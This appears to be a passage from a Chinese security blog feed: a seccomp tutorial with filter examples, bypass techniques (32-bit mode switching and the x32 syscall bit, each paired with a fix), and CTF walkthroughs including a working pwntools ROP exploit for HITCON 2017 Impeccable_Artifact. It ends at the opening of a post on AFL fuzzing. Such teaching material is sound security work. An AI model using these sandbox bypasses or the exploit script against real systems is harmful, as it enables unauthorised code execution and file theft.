SECCOMP_RET_TRAP    0x00030000U /* disallow and force a SIGSYS */#define SECCOMP_RET_ERRNO    0x00050000U /* returns an errno */#define SECCOMP_RET_TRACE    0x7ff00000U /* pass to a tracer or disallow */#define SECCOMP_RET_ALLOW    0x7fff0000U /* allow */</code></pre><p>Seccomp 编写规则时会使用到一个 <code>seccomp_data</code> 结构体，定义在 <a href="https://elixir.bootlin.com/linux/v4.4.31/source/include/uapi/linux/seccomp.h" target="_blank" rel="noopener">include/uapi/linux/seccomp.h</a>（<code>/usr/include/linux/seccomp.h</code>）中。各个成员如下：</p><ul><li><code>nr</code>：系统调用号；</li><li><code>arch</code>：定义在 <a href="https://elixir.bootlin.com/linux/v4.4.31/source/include/uapi/linux/audit.h" target="_blank" rel="noopener">include/uapi/linux/audit.h</a>（<code>/usr/include/linux/audit.h</code>）中；<ul><li><code>i386</code>：0x40000003；</li><li><code>amd64</code>：0xc000003e。</li></ul></li><li><code>instruction_pointer</code>：系统调用号对应的 IP；</li><li><code>args</code>：系统调用号。<ul><li><code>i386</code>：ebx、ecx、edx、esi、edi；</li><li><code>amd64</code>：rdi、rsi、rdx、r10、r8、r9。</li></ul></li></ul><pre><code class="cpp">#define AUDIT_ARCH_I386        (EM_386|__AUDIT_ARCH_LE)#define AUDIT_ARCH_IA64        (EM_IA_64|__AUDIT_ARCH_64BIT|__AUDIT_ARCH_LE)/** * struct seccomp_data - the format the BPF program executes over. * @nr: the system call number * @arch: indicates system call convention as an AUDIT_ARCH_* value *        as defined in &lt;linux/audit.h&gt;. * @instruction_pointer: at the time of the system call. * @args: up to 6 system call arguments always stored as 64-bit values *        regardless of the architecture. */struct seccomp_data {    int nr;    __u32 arch;    __u64 instruction_pointer;    __u64 args[6];};</code></pre><p>下面给一个例子测试，<code>SECCOMP_RET_ALLOW</code> 表示允许所有调用；<code>SECCOMP_RET_KILL</code> 表示禁止所有调用：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;linux/seccomp.h&gt;#include &lt;linux/filter.h&gt;int main() {    struct sock_filter filter[] = {//        BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),        BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),    };    struct sock_fprog prog = {        .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),        .filter = filter,    };    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog);    printf(&quot;###\n&quot;);    system(&quot;ls&quot;);}</code></pre><p><code>SECCOMP_RET_ALLOW</code> 会正常执行，而 <code>SECCOMP_RET_KILL</code> 会报“invalid system call”：</p><pre><code class="bash">➜  seccomp ./sec[1]    3372 invalid system call  ./sec</code></pre><p>禁用 execve 系统调用的规则如下。首先取出 <code>seccomp_data</code> 中的 <code>nr</code>，然后和 59 比较。如果相等，则跳过一条规则，即被 kill；不相等的话，继续执行下一条规则，即 allow：</p><pre><code class="cpp">struct sock_filter filter[] = {    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0), // offset = 0 -&gt; nr    BPF_JUMP(BPF_JMP + BPF_JEQ, 59, 1, 0), // compare nr with 59 (SYS_execve = 59)    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),};</code></pre><p>Seccomp 的过滤规则可以通过 gdb 来 dump 出来，即第二次调用 prctl 时的第三个参数：</p><pre><code>(gdb) p/x $rdx$1 = 0x7fffffffe480(gdb) x/2gx 0x7fffffffe4800x7fffffffe480:    0x00007fffffff0004    0x00007fffffffe490(gdb) x/4gx 0x00007fffffffe4900x7fffffffe490:    0x0000000000000020    0x0000003b000100150x7fffffffe4a0:    0x7fff000000000006    0x0000000000000006(gdb) dump memory dd 0x00007fffffffe490 0x00007fffffffe490+4*8</code></pre><p>然后使用 libseccomp 中的 scmp_bpf_disasm 反编译获取大致的过滤规则，通常需要根据反编译出来的结果去查找对应函数的意义：</p><pre><code class="bash">➜  seccomp scmp_bpf_disasm &lt; dd line  OP   JT   JF   K================================= 0000: 0x20 0x00 0x00 0x00000004   ld  $data[4] 0001: 0x15 0x00 0x03 0xc000003e   jeq 3221225534 true:0002 false:0005 0002: 0x20 0x00 0x00 0x00000000   ld  $data[0] 0003: 0x15 0x01 0x00 0x0000003b   jeq 59   true:0005 false:0004 0004: 0x06 0x00 0x00 0x7fff0000   ret ALLOW 0005: 0x06 0x00 0x00 0x00000000   ret KILL</code></pre><p>使用 seccomp-tools 也可以进行解析。</p><h2 id="Seccomp-using-libseccomp"><a href="#Seccomp-using-libseccomp" class="headerlink" title="Seccomp using libseccomp"></a>Seccomp using libseccomp</h2><blockquote><p>根据 veritas501 的博客做的一些记录。</p></blockquote><p>这边需要先安装一些依赖才会有 <code>seccomp.h</code> 头文件：</p><pre><code class="bash">sudo apt-get install libseccomp-dev libseccomp2 seccomp</code></pre><p>具体在 <code>/usr/include/seccomp.h</code> 中，一些选项如下：</p><pre><code class="cpp">/* * seccomp actions *//** * Kill the process */#define SCMP_ACT_KILL           0x00000000U/** * Throw a SIGSYS signal */#define SCMP_ACT_TRAP           0x00030000U/** * Return the specified error code */#define SCMP_ACT_ERRNO(x)       (0x00050000U | ((x) &amp; 0x0000ffffU))/** * Notify a tracing process with the specified value */#define SCMP_ACT_TRACE(x)       (0x7ff00000U | ((x) &amp; 0x0000ffffU))/** * Allow the syscall to be executed */#define SCMP_ACT_ALLOW          0x7fff0000U</code></pre><p><code>seccomp_init()</code> 用于初始化过滤状态：</p><pre><code class="cpp">/** * Initialize the filter state * @param def_action the default filter action * * This function initializes the internal seccomp filter state and should * be called before any other functions in this library to ensure the filter * state is initialized.  Returns a filter context on success, NULL on failure. * */scmp_filter_ctx seccomp_init(uint32_t def_action);</code></pre><p><code>seccomp_rule_add()</code> 用于添加新的规则。其中如果 <code>arg_cnt</code> 不为 0，那么 <code>arg_cnt</code> 表示后面限制的参数的个数，故只有参数满足要求时才会拦截：</p><pre><code class="cpp">/** * Add a new rule to the filter * @param ctx the filter context * @param action the filter action * @param syscall the syscall number * @param arg_cnt the number of argument filters in the argument filter chain * @param ... scmp_arg_cmp structs (use of SCMP_ARG_CMP() recommended) * * This function adds a series of new argument/value checks to the seccomp * filter for the given syscall; multiple argument/value checks can be * specified and they will be chained together (AND&#39;d together) in the filter. * If the specified rule needs to be adjusted due to architecture specifics it * will be adjusted without notification.  Returns zero on success, negative * values on failure. * */int seccomp_rule_add(scmp_filter_ctx ctx,                     uint32_t action, int syscall, unsigned int arg_cnt, ...);** * Specify an argument comparison struct for use in declaring rules * @param arg the argument number, starting at 0 * @param op the comparison operator, e.g. SCMP_CMP_* * @param datum_a dependent on comparison * @param datum_b dependent on comparison, optional */#define SCMP_CMP(...)           ((struct scmp_arg_cmp){__VA_ARGS__})/** * Specify an argument comparison struct for argument 0 */#define SCMP_A0(...)            SCMP_CMP(0, __VA_ARGS__)/** * Specify an argument comparison struct for argument 1 */#define SCMP_A1(...)            SCMP_CMP(1, __VA_ARGS__)/** * Specify an argument comparison struct for argument 2 */#define SCMP_A2(...)            SCMP_CMP(2, __VA_ARGS__)/** * Specify an argument comparison struct for argument 3 */#define SCMP_A3(...)            SCMP_CMP(3, __VA_ARGS__)/** * Specify an argument comparison struct for argument 4 */#define SCMP_A4(...)            SCMP_CMP(4, __VA_ARGS__)/** * Specify an argument comparison struct for argument 5 */#define SCMP_A5(...)            SCMP_CMP(5, __VA_ARGS__)/** * Comparison operators */enum scmp_compare {        _SCMP_CMP_MIN = 0,        SCMP_CMP_NE = 1,                /**&lt; not equal */        SCMP_CMP_LT = 2,                /**&lt; less than */        SCMP_CMP_LE = 3,                /**&lt; less than or equal */        SCMP_CMP_EQ = 4,                /**&lt; equal */        SCMP_CMP_GE = 5,                /**&lt; greater than or equal */        SCMP_CMP_GT = 6,                /**&lt; greater than */        SCMP_CMP_MASKED_EQ = 7,         /**&lt; masked equality */        _SCMP_CMP_MAX,};/** * Argument datum */typedef uint64_t scmp_datum_t;/** * Argument / Value comparison definition */struct scmp_arg_cmp {        unsigned int arg;       /**&lt; argument number, starting at 0 */        enum scmp_compare op;   /**&lt; the comparison op, e.g. SCMP_CMP_* */        scmp_datum_t datum_a;        scmp_datum_t datum_b;};</code></pre><p><code>seccomp_load()</code> 用来应用规则：</p><pre><code class="cpp">/** * Loads the filter into the kernel * @param ctx the filter context * * This function loads the given seccomp filter context into the kernel.  If * the filter was loaded correctly, the kernel will be enforcing the filter * when this function returns.  Returns zero on success, negative values on * error. * */int seccomp_load(const scmp_filter_ctx ctx);</code></pre><p>同样用最简单的例子测试一下：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;seccomp.h&gt;#include &lt;linux/seccomp.h&gt;char *args[] = {    &quot;/bin/ls&quot;,    0,};int main() {    scmp_filter_ctx ctx;    ctx = seccomp_init(SCMP_ACT_ALLOW);    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);    seccomp_load(ctx);    printf(&quot;###\n&quot;);    system(&quot;ls&quot;);    execve(args[0], args, 0);    return 0;}</code></pre><p>测试发现这里对 system 没有提示，直接过滤了，对 execve 会提示“invalid system call”。不过具体的功能是一样的：</p><pre><code class="bash">➜  seccomp ./sec###[1]    5480 invalid system call  ./sec</code></pre><h1 id="Bypass-Seccomp"><a href="#Bypass-Seccomp" class="headerlink" title="Bypass Seccomp"></a>Bypass Seccomp</h1><p>一般来说 64 位下的 Seccomp 会和前面的一样直接禁掉某个调用号。这种情况有一些方法可以对其绕过。</p><h2 id="绕过没有检查架构（arch）"><a href="#绕过没有检查架构（arch）" class="headerlink" title="绕过没有检查架构（arch）"></a>绕过没有检查架构（arch）</h2><p>一般题目里至少有 <code>SYS_mmap</code> 或 <code>SYS_mprotect</code> 能用，所以通常有机会执行任意 shellcode。通过下面的函数可以在 x86 和 x86_64 之间切换。<code>retf</code> 相当于 <code>POP IP</code> 和 <code>POP CS</code> 两条指令，而 32 位下 CS 为 0x23；64 位下 CS 为 0x33：</p><pre><code class="nasm">to32:    mov DWORD [rsp + 4], 0x23    retfto64:    mov DWORD [esp + 4], 0x33    retf</code></pre><p>假如程序的过滤规则和上面的一样，我们编写一个 <code>my_execve</code> 来调用：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;linux/seccomp.h&gt;#include &lt;linux/filter.h&gt;extern void my_execve(void *, void *, void *);char *args[] = {    &quot;/bin/ls&quot;,    0,};int main() {    struct sock_filter filter[] = {        BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0), // offset = 0 -&gt; nr        BPF_JUMP(BPF_JMP + BPF_JEQ, 59, 1, 0), // SYS_execve = 59        BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),        BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),    };    struct sock_fprog prog = {        .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),        .filter = filter,    };    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog);    my_execve(args[0], args, 0);}</code></pre><p><code>my_execve</code> 实现如下，因为 32 位下栈会少一半，所以为了防止程序 crash 需要搬一下栈：</p><pre><code class="nasm">section .textglobal my_execvemy_execve:    lea rsp, [stack]    call to32    mov eax, 11    mov ebx, edi    mov ecx, esi    int 0x80    retto32:    mov DWORD [rsp + 4], 0x23    retfsection .bss    resb 0x400stack:</code></pre><p>这样就可以成功执行 ls（如果开 sh 的话也没有办法执行命令的，因为 seccomp 的规则会在进程间继承）：</p><pre><code class="bash">➜  seccomp ./secMakefile  dd  sec  sec.asm  sec.c  sec.o</code></pre><p>限制办法就是添加对 arch 的检查：</p><pre><code class="cpp">struct sock_filter filter[] = {    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 4), // ld arch    BPF_JUMP(BPF_JMP + BPF_JEQ, 0xc000003e, 0, 3), // arch == x86_64    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0), // offset = 0 -&gt; nr    BPF_JUMP(BPF_JMP + BPF_JEQ, 59, 1, 0), // SYS_execve = 59    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),};</code></pre><h2 id="没有过滤-X32-SYSCALL-BIT"><a href="#没有过滤-X32-SYSCALL-BIT" class="headerlink" title="没有过滤 __X32_SYSCALL_BIT"></a>没有过滤 <code>__X32_SYSCALL_BIT</code></h2><ul><li>在 x86_64 下的一种特殊模式，使用 64 位寄存器和 32 位地址。</li><li>x32 中 <code>nr</code> 会加 <code>__X32_SYSCALL_BIT</code>（0x40000000），见 <a href="https://elixir.bootlin.com/linux/v4.4.31/source/arch/x86/include/uapi/asm/unistd.h" target="_blank" rel="noopener">include/uapi/asm/unistd.h</a>（<code>/usr/include/asm/unistd_x32.h</code>）</li><li>原本的系统调用号加上 0x40000000 是一样的效果</li></ul><p>把 my_execve 修改如下：</p><pre><code class="nasm">section .textglobal my_execvemy_execve:    mov rax, 59 + 0x40000000    syscall</code></pre><p>同样可以正常执行</p><pre><code class="bash">➜  seccomp ./secMakefile  dd  sec  sec.asm  sec.c  sec.o</code></pre><p>添加对系统调用号的检查来进行限制：</p><pre><code class="cpp">struct sock_filter filter[] = {    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 4), // ld arch    BPF_JUMP(BPF_JMP + BPF_JEQ, 0xc000003e, 0, 4), // arch == x86_64    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0), // offset = 0 -&gt; nr    BPF_JUMP(BPF_JMP + BPF_JSET, 0x40000000, 2, 0), // nr &amp; 0x40000000    BPF_JUMP(BPF_JMP + BPF_JEQ, 59, 1, 0), // SYS_execve = 59    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),};</code></pre><h2 id="没有道理的绕过方法"><a href="#没有道理的绕过方法" class="headerlink" title="没有道理的绕过方法"></a>没有道理的绕过方法</h2><ul><li>部分调用号是给 x32 用的，但在 x86_64 下一样能用</li><li>59、520、59+0x40000000、520+0x40000000 都是 execve</li><li>322、322+0x40000000、545、545+0x40000000（stub_execveat，和 execve 类似）也可以</li></ul><h1 id="Binary-Test"><a href="#Binary-Test" class="headerlink" title="Binary Test"></a>Binary Test</h1><p>使用 seccomp-tools 对一些题目进行测试。</p><h2 id="pwnable-tw-orw"><a href="#pwnable-tw-orw" class="headerlink" title="pwnable.tw-orw"></a>pwnable.tw-orw</h2><p>这道题当时是只能用 read、open、write 三个调用来读 flag。这里用 seccomp-tools 来查看一下是怎么实现的限制：</p><pre><code class="bash">$ seccomp-tools dump ./orw line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38) 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</code></pre><p>可以看到先是检查了 arch 必须是 32 位，然后系统调用只允许 rt_sigreturn、sigreturn、exit_group、exit、open、read、write。</p><h2 id="0CTF-2018-mathgame"><a href="#0CTF-2018-mathgame" class="headerlink" title="0CTF-2018-mathgame"></a>0CTF-2018-mathgame</h2><p>这道题也是限制了 arch 和一些调用：</p><pre><code class="bash">$ seccomp-tools dump ./mathgameStarting system, please wait...System started! line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x01 0x00 0x40000003  if (A == ARCH_I386) goto 0003 0002: 0x06 0x00 0x00 0x00000000  return KILL 0003: 0x20 0x00 0x00 0x00000000  A = sys_number 0004: 0x15 0x00 0x01 0x000000ad  if (A != rt_sigreturn) goto 0006 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0006: 0x15 0x00 0x01 0x00000077  if (A != sigreturn) goto 0008 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0008: 0x15 0x00 0x01 0x000000fc  if (A != exit_group) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0010: 0x15 0x00 0x01 0x00000001  if (A != exit) goto 0012 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0012: 0x15 0x00 0x01 0x00000005  if (A != open) goto 0014 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0014: 0x15 0x00 0x01 0x00000003  if (A != read) goto 0016 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0016: 0x15 0x00 0x01 0x00000004  if (A != write) goto 0018 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0018: 0x15 0x00 0x01 0x000000c5  if (A != fstat64) goto 0020 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0020: 0x15 0x00 0x01 0x00000036  if (A != ioctl) goto 0022 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0022: 0x15 0x00 0x01 0x0000008c  if (A != _llseek) goto 0024 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0024: 0x15 0x00 0x01 0x000000c0  if (A != mmap2) goto 0026 0025: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0026: 0x15 0x00 0x01 0x0000005b  if (A != munmap) goto 0028 0027: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0028: 0x15 0x00 0x01 0x0000002d  if (A != brk) goto 0030 0029: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0030: 0x06 0x00 0x00 0x00000000  return KILL</code></pre><h1 id="Related-CTF-Challs"><a href="#Related-CTF-Challs" class="headerlink" title="Related CTF Challs"></a>Related CTF Challs</h1><p>CTF 中涉及 Seccomp 的一些二进制题。记录一下用于在 IDA 中插入的 Seccomp 结构体：</p><pre><code class="cpp">struct sock_filter {    /* Filter block */    uint16_t    code;   /* Actual filter code */    uint8_t    jt;    /* Jump true */    uint8_t    jf;    /* Jump false */    uint32_t    k;      /* Generic multiuse field */};struct sock_fprog {    /* Required for SO_ATTACH_FILTER. */    unsigned short        len;    /* Number of filter blocks */    struct sock_filter *filter;};</code></pre><h2 id="HITCON-2017-seccomp"><a href="#HITCON-2017-seccomp" class="headerlink" title="HITCON-2017-seccomp"></a>HITCON-2017-seccomp</h2><p>先是一道逆向。程序不难，主要是逆 Seccomp 的部分来得出正确的 6 个参数。这里放一下<a href="https://blukat29.github.io/2017/11/hitcon-quals-2017-seccomp/" target="_blank" rel="noopener">其他大佬的 Writeup</a>：</p><pre><code class="cpp">int __cdecl main(int argc, const char **argv, const char **envp){  signed int i; // [rsp+Ch] [rbp-54h]  struct sock_fprog prog; // [rsp+10h] [rbp-50h]  __int64 args[6]; // [rsp+20h] [rbp-40h]  unsigned __int64 v7; // [rsp+58h] [rbp-8h]  v7 = __readfsqword(0x28u);  prog.len = 4059;  prog.filter = (struct sock_filter *)&amp;s;  memset(args, 0, sizeof(args));  for ( i = 0; i &lt;= 4; ++i )    _isoc99_scanf(&quot;%llu&quot;, &amp;args[i]);  prctl(38, 1LL, 0LL, 0LL, 0LL);  if ( prctl(22, 2LL, &amp;prog) )  {    perror(&quot;prctl&quot;);    exit(1);  }  syscall(4919LL, args[0], args[1], args[2], args[3], args[4], args[5]);  printf(&quot;Excellent! flag: hitcon{%s}\n&quot;, args);  return 0;}</code></pre><h2 id="HITCON-2017-Impeccable-Artifact"><a href="#HITCON-2017-Impeccable-Artifact" class="headerlink" title="HITCON-2017-Impeccable_Artifact"></a>HITCON-2017-Impeccable_Artifact</h2><p>程序保护全开，且能对栈上的任意 8 个字节进行读写，同时没有对下标进行检查，所以能造成任意地址读写。然后一开始在 prepare 函数中对 syscall 进行了限制：</p><pre><code class="cpp">__int64 __fastcall main(__int64 a1, char **a2, char **a3){  int c; // [rsp+8h] [rbp-658h]  int idx; // [rsp+Ch] [rbp-654h]  __int64 arr[201]; // [rsp+10h] [rbp-650h]  unsigned __int64 v7; // [rsp+658h] [rbp-8h]  v7 = __readfsqword(0x28u);  prepare();  memset(arr, 0, 0x640uLL);  while ( 1 )  {    menu();    idx = 0;    _isoc99_scanf(&quot;%d&quot;, &amp;c);    if ( c != 1 &amp;&amp; c != 2 )      break;    puts(&quot;Idx?&quot;);    _isoc99_scanf(&quot;%d&quot;, &amp;idx);    if ( c == 1 )    {      printf(&quot;Here it is: %lld\n&quot;, arr[idx]);    }    else    {      puts(&quot;Give me your number:&quot;);      _isoc99_scanf(&quot;%lld&quot;, &amp;arr[idx]);    }  }  return 0LL;}</code></pre><p>用 seccomp-tools 中可以查看到程序判断了系统架构，然后将传入的第三个参数作为系统调用号（即 rdx 等于 rax），后面会判断 sys_number 和 rdx 是否相等，如果相等也能过 check，这个地方可以构造出一些本身被限制的函数。然后允许 read、write、fstat 等一些函数：</p><pre><code> line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x10 0xc000003e  if (A != ARCH_X86_64) goto 0018 0002: 0x20 0x00 0x00 0x00000020  A = args[2] 0003: 0x07 0x00 0x00 0x00000000  X = A 0004: 0x20 0x00 0x00 0x00000000  A = sys_number 0005: 0x15 0x0d 0x00 0x00000000  if (A == read) goto 0019 0006: 0x15 0x0c 0x00 0x00000001  if (A == write) goto 0019 0007: 0x15 0x0b 0x00 0x00000005  if (A == fstat) goto 0019 0008: 0x15 0x0a 0x00 0x00000008  if (A == lseek) goto 0019 0009: 0x15 0x01 0x00 0x00000009  if (A == mmap) goto 0011 0010: 0x15 0x00 0x03 0x0000000a  if (A != mprotect) goto 0014 0011: 0x87 0x00 0x00 0x00000000  A = X 0012: 0x54 0x00 0x00 0x00000001  A &amp;= 0x1 0013: 0x15 0x04 0x05 0x00000001  if (A == 1) goto 0018 else goto 0019 0014: 0x1d 0x04 0x00 0x0000000b  if (A == X) goto 0019 0015: 0x15 0x03 0x00 0x0000000c  if (A == brk) goto 0019 0016: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0019 0017: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0019 0018: 0x06 0x00 0x00 0x00000000  return KILL 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW</code></pre><p>经过调试可以找到某些地址泄漏 Binary 和 libc，然后改 ret 处的代码构造 ROP 就能任意文件读取：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;split&#39;, &#39;-h&#39;]p = process(&#39;./artifact&#39;)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)def cmd(c):    p.recvuntil(&#39;Choice?\n&#39;)    p.sendline(str(c))def show(idx):    cmd(1)    p.recvuntil(&#39;Idx?\n&#39;)    p.sendline(str(idx))    p.recvuntil(&#39;Here it is:&#39;)    return int(p.recvuntil(&#39;\n&#39;, drop=True))def memo(idx, num):    cmd(2)    p.recvuntil(&#39;Idx?\n&#39;)    p.sendline(str(idx))    p.recvuntil(&#39;Give me your number:\n&#39;)    p.sendline(str(num))def leave():    cmd(3)binary_base = show(202) - 0xbb0bss_buf = binary_base + 0x202000info(&#39;binary_base = &#39; + hex(binary_base))offset = 0x00007ffff7a2d830 - 0x7ffff7a0d000libc_base = show(203) - offsetinfo(&#39;libc_base = &#39; + hex(libc_base))pop_rdi_ret = libc_base + next(libc.search(asm(&#39;pop rdi ; ret&#39;)))pop_rsi_ret = libc_base + next(libc.search(asm(&#39;pop rsi ; ret&#39;)))pop_rdx_ret = libc_base + next(libc.search(asm(&#39;pop rdx ; ret&#39;)))read_addr = libc_base + libc.symbols[&#39;read&#39;]write_addr = libc_base + libc.symbols[&#39;write&#39;]open_addr = libc_base + libc.symbols[&#39;open&#39;]def set_syscall(idx, syscall, rdi, rsi, rdx):    memo(idx, pop_rdi_ret)    memo(idx + 1, rdi)    memo(idx + 2, pop_rsi_ret)    memo(idx + 3, rsi)    memo(idx + 4, pop_rdx_ret)    memo(idx + 5, rdx)    memo(idx + 6, syscall)file_name_addr = bss_buf + 0x500buf_addr = bss_buf + 0x600set_syscall(203, read_addr, 0, file_name_addr, 0x20) # read file&#39;s nameset_syscall(210, open_addr, file_name_addr, 0, 2) # open&#39;s syscall number == 2set_syscall(217, read_addr, 3, buf_addr, 0x1000) # read file&#39;s contentset_syscall(224, write_addr, 1, buf_addr, 0x1000) # write to stdoutleave()p.sendline(&#39;exp.py\x00&#39;)p.interactive()</code></pre><h2 id="BSides-CTF-2015-Baby-Playpen-Fence"><a href="#BSides-CTF-2015-Baby-Playpen-Fence" class="headerlink" title="BSides-CTF-2015-Baby_Playpen_Fence"></a>BSides-CTF-2015-Baby_Playpen_Fence</h2><p>TODO</p><h2 id="BSides-CTF-2015-Big-Prison-Fence"><a href="#BSides-CTF-2015-Big-Prison-Fence" class="headerlink" title="BSides-CTF-2015-Big_Prison_Fence"></a>BSides-CTF-2015-Big_Prison_Fence</h2><p>TODO</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.youtube.com/watch?v=gQXyZY7Ucjc" target="_blank" rel="noopener">https://www.youtube.com/watch?v=gQXyZY7Ucjc</a><br><a href="https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/" target="_blank" rel="noopener">https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/</a><br><a href="https://www.linuxidc.com/Linux/2015-02/112913.htm" target="_blank" rel="noopener">https://www.linuxidc.com/Linux/2015-02/112913.htm</a><br><a href="https://en.wikipedia.org/wiki/Seccomp" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Seccomp</a><br><a href="https://atum.li/2017/04/25/linuxsandbox/#seccomp" target="_blank" rel="noopener">https://atum.li/2017/04/25/linuxsandbox/#seccomp</a><br><a href="https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a><br><a href="https://github.com/briansp8210/CTF-writeup/tree/master/HITCON-2017-qual/Impeccable-Artifact" target="_blank" rel="noopener">https://github.com/briansp8210/CTF-writeup/tree/master/HITCON-2017-qual/Impeccable-Artifact</a><br><a href="https://blukat29.github.io/2017/11/hitcon-quals-2017-artifact/" target="_blank" rel="noopener">https://blukat29.github.io/2017/11/hitcon-quals-2017-artifact/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Seccomp 可以为“不可信的纯计算型代码”提供一个“安全（SAFE, not SECURE）”的运行环境，以保护你的系统和应用程序的正常运行不受不可信代码的干扰。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="linux" scheme="blog.b3ale.cn/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Fuzzing to Exploit</title>
    <link href="blog.b3ale.cn/2020/04/13/Fuzzing-to-Exploit/"/>
    <id>blog.b3ale.cn/2020/04/13/Fuzzing-to-Exploit/</id>
    <published>2020-04-13T11:06:40.000Z</published>
    <updated>2020-04-24T10:32:02.452Z</updated>
    
    <content type="html"><![CDATA[<p>AFL Fuzz 初体验。</p><a id="more"></a><blockquote><p>“Fuzzing is a Black Box software testing technique, which basically consists in finding implementation bugs using malformed/semi-malformed data injection in an automated fashion.”</p></blockquote><h1 id="American-Fuzzy-Lop"><a href="#American-Fuzzy-Lop" class="headerlink" title="American Fuzzy Lop"></a>American Fuzzy Lop</h1><p>AFL（American Fuzzy Lop）是由安全研究员 Michal Zalewski（@lcamtuf）开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。</p><ol><li>从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage）；</li><li>选择一些输入文件，作为初始测试集加入输入队列（queue）；</li><li>将队列中的文件按一定的策略进行“突变”；</li><li>如果经过变异文件更新了覆盖范围，则将其保留添加到队列中；</li><li>上述过程会一直循环进行，期间触发了 crash 的文件会被记录下来。</li></ol><p><img src="/pics/Fuzzing-to-Exploit/1.png" srcset="/img/loading.gif" alt></p><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>安装 AFL 的方式和一般源码编译的程序一样。其中 AFL 的 QEMU 模式常用于黑盒测试。但是因为 AFL 使用的 QEMU 版本太旧，<code>util/memfd.c</code> 中定义的函数 <code>memfd_create()</code> 会和 glibc 中的同名函数冲突，AFL 在 qemu_mode 文件夹下提供了一个脚本 build_qemu_support.sh，用于 patch 一个新的 QEMU。安装完成后，可以看到有以下这些命令：</p><pre><code class="bash">➜  afl-2.52b afl-afl-analyze     afl-clang++     afl-fuzz        afl-gcc         afl-plot        afl-showmap 